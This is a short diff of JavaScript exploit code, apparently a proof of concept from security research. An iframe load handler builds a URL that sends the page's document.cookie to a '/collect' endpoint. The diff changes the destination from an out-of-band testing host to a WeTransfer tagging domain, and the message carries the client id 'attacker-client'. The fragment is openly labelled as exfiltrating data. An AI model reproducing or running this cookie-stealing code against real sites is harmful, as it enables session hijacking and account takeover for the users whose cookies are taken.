@@ -18,7 +18,7 @@
             try {
                 console.debug('[DEBUG] iframe loaded:', iframe.src);
                 // 2. Send command to exfiltrate data
-                const collectUrl = `https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/collect?cookies=${encodeURIComponent(document.cookie)}`;
+                const collectUrl = `https://tagging.wetransfer.com/collect?cookies=${encodeURIComponent(document.cookie)}`;
                 const collectMsg = {
                     type: 1,
                     clientId: 'attacker-client',
